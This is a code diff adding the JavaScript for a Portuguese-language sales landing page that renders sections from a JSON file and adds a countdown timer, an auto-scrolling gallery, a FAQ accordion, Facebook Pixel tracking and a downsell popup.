+        <div class="faq-item">
+          <div class="faq-q">${i.q} <span class="arrow">+</span></div>
+          <div class="faq-a">${i.a}</div>
+        </div>`;
+    }
+    return `
+      <h2>${f.heading}</h2>
+      <div class="faq">${f.items.map(item).join('')}</div>
+    `;
+  }
+
+  function finalCtaHtml(fc){
+    return `
+      <div class="final-cta">
+        <h2>${fc.heading}</h2>
+        <p>${fc.text}</p>
+        <a href="${fc.ctaHref}" class="cta-btn">${fc.ctaText}</a>
+      </div>
+    `;
+  }
+
+  function downsellPopupHtml(dp){
+    return `
+      <h3>${dp.title}</h3>
+      <p>${dp.textHtml}</p>
+      <a href="${dp.ctaHref}" class="cta-btn">${dp.ctaText}</a>
+      <span class="close-popup" id="close-popup">${dp.closeText}</span>
+    `;
+  }
+
+  // ---------- RENDER + COMPORTAMENTO ----------
+
+  function renderPage(c){
+    document.title = c.meta.title;
+    document.getElementById('ticker-track').innerHTML = tickerHtml(c.ticker);
+    document.getElementById('section-hero').innerHTML = heroHtml(c.hero);
+    document.getElementById('section-results').innerHTML = resultsHtml(c.results);
+    document.getElementById('section-showcase').innerHTML = showcaseHtml(c.showcase);
+    document.getElementById('section-pain').innerHTML = painHtml(c.pain);
+    document.getElementById('section-what-you-get').innerHTML = whatYouGetHtml(c.whatYouGet);
+    document.getElementById('section-acervo-rural').innerHTML = acervoRuralHtml(c.acervoRural);
+    document.getElementById('section-testimonials').innerHTML = testimonialsHtml(c.testimonials);
+    document.getElementById('section-bonuses').innerHTML = bonusesHtml(c.bonuses);
+    document.getElementById('section-rural-packs').innerHTML = ruralPacksHtml(c.ruralPacks);
+    document.getElementById('pricing').innerHTML = pricingHtml(c.pricing);
+    document.getElementById('section-guarantee').innerHTML = guaranteeHtml(c.guarantee);
+    document.getElementById('section-faq').innerHTML = faqHtml(c.faq);
+    document.getElementById('section-final-cta').innerHTML = finalCtaHtml(c.finalCta);
+    document.getElementById('section-footer').innerHTML = c.footerHtml;
+    document.getElementById('downsell-popup').innerHTML = downsellPopupHtml(c.downsellPopup);
+
+    initBehavior(c);
+  }
+
+  function initBehavior(c){
+    // Timer regressivo (atualiza todos os relogios do ticker)
+    (function(){
+      var duration = c.timerSeconds;
+      var els = document.querySelectorAll('.timer-el');
+      var timer = setInterval(function(){
+        var m = Math.floor(duration/60), s = duration%60;
+        var txt = (m<10?'0':'')+m+':'+(s<10?'0':'')+s;
+        els.forEach(function(el){ el.textContent = txt; });
+        if(--duration < 0){ clearInterval(timer); els.forEach(function(el){ el.textContent = '00:00'; }); }
+      }, 1000);
+    })();
+
+    // Rolagem automatica da galeria de resultados
+    (function(){
+      var gallery = document.querySelector('.results-gallery');
+      if(!gallery) return;
+
+      gallery.innerHTML += gallery.innerHTML;
+
+      var paused = false;
+      var resumeTimeout;
+      var halfWidth = 0;
+      function calcHalfWidth(){ halfWidth = gallery.scrollWidth / 2; }
+      window.addEventListener('load', calcHalfWidth);
+      setTimeout(calcHalfWidth, 300);
+
+      function tick(){
+        if(!paused && halfWidth > 0){
+          gallery.scrollLeft += 1.4;
+          if(gallery.scrollLeft >= halfWidth){
+            gallery.scrollLeft -= halfWidth;
+          }
+        }
+        requestAnimationFrame(tick);
+      }
+      requestAnimationFrame(tick);
+
+      function pauseAutoScroll(){
+        paused = true;
+        clearTimeout(resumeTimeout);
+        resumeTimeout = setTimeout(function(){ paused = false; }, 2500);
+      }
+      gallery.addEventListener('touchstart', pauseAutoScroll, {passive:true});
+      gallery.addEventListener('mousedown', pauseAutoScroll);
+      gallery.addEventListener('wheel', pauseAutoScroll, {passive:true});
+    })();
+
+    // FAQ accordion
+    document.querySelectorAll('.faq-item').forEach(function(item){
+      item.querySelector('.faq-q').addEventListener('click', function(){
+        var wasOpen = item.classList.contains('open');
+        document.querySelectorAll('.faq-item').forEach(function(i){ i.classList.remove('open'); });
+        if(!wasOpen) item.classList.add('open');
+      });
+    });
+
+    // Pixel: ViewContent ao ver a secao de pricing
+    if(typeof fbq !== 'undefined'){
+      var pricingSeen = false;
+      var pricingSection = document.getElementById('pricing');
+      if(pricingSection){
+        var obs = new IntersectionObserver(function(entries){
+          entries.forEach(function(entry){
+            if(entry.isIntersecting && !pricingSeen){
+              pricingSeen = true;
+              fbq('track', 'ViewContent');
+            }
+          });
+        }, {threshold:0.4});
+        obs.observe(pricingSection);
+      }
+
+      // Pixel: InitiateCheckout ao clicar em qualquer CTA de checkout
+      document.querySelectorAll('a[href*="pay.wiapy.com"]').forEach(function(btn){
+        btn.addEventListener('click', function(){
+          fbq('track', 'InitiateCheckout');
+        });
+      });
+    }
+
+    // Popup downsell no clique do plano basico
+    var btnBasico = document.getElementById('btn-basico');
+    if(btnBasico){
+      btnBasico.addEventListener('click', function(e){
+        e.preventDefault();
+        document.getElementById('downsell-overlay').classList.add('active');
+      });
+    }
+    var closePopup = document.getElementById('close-popup');
+    if(closePopup){
+      var basicoPlan = c.pricing.plans.find(function(p){ return p.id === 'basico'; });
+      closePopup.addEventListener('click', function(){
+        window.location.href = basicoPlan.ctaHref;
+      });
+    }
+  }
+
+  fetch('content.json')
+    .then(function(res){ return res.json(); })
+    .then(renderPage)
+    .catch(function(err){ console.error('Falha ao carregar content.json:', err); });
 </script>
 
 </body>
